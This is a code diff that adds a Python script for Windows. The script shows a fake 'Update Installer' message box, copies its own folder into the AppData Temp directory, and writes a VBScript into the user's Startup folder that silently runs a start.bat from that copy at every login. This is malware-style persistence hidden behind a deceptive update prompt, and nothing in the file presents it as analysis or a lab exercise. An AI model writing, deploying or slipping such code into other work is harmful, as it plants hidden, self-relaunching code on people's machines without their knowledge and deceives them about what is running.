@@ -1,0 +1,48 @@
+import os
+import shutil
+import ctypes
+from multiprocessing import Process
+
+def msg():
+    checkdir = os.getcwd()
+    baddir = os.getenv('APPDATA') + '\Roaming\Temp'
+    if checkdir == baddir:
+        pass
+    else:
+        WS_EX_TOPMOST = 0x40000
+        windowTitle = "Update Installer"
+        message = "Downloading an update, please wait..."
+
+        # display a message box; execution will stop here until user acknowledges
+        ctypes.windll.user32.MessageBoxExW(None, message, windowTitle, WS_EX_TOPMOST)
+
+def sec():
+    open('nolock.txt','w')
+
+def zzz():
+    print(os.getcwd())
+    checkdir = os.getcwd()
+    baddir = os.getenv('APPDATA') + '\Roaming\Temp'
+    if checkdir == baddir:
+        pass
+    else:
+        f = open("demofile2.txt", "a")
+        f.write(os.getcwd())
+        f.close()
+        src_dir = os.getcwd()
+        dest = os.getenv('APPDATA') + '\Roaming\Temp'
+        shutil.copytree(src_dir, dest, dirs_exist_ok = True)
+        bat = os.getenv('APPDATA') + '\Microsoft\Windows\Start Menu\Programs\StartUp'
+        myBat = open(bat + '\\run.vbs','w')
+        myBat.write('Set WshShell = CreateObject("WScript.Shell")\n')
+        myBat.write('WshShell.CurrentDirectory = ' + '\"' + dest + '\"\n') 
+        myBat.write('WshShell.Run chr(34) & ')
+        myBat.write('\"' + dest + '\\start.bat' + '\"')
+        myBat.write(' & Chr(34), 0\n')
+        myBat.write('Set WshShell = Nothing')
+        myBat.close()
+    
+if __name__ == '__main__':
+    Process(target=msg).start()
+    Process(target=sec).start()
+    Process(target=zzz).start()
